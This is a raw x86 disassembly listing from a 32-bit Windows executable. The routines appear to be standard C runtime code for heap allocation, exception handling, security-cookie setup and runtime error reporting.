  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
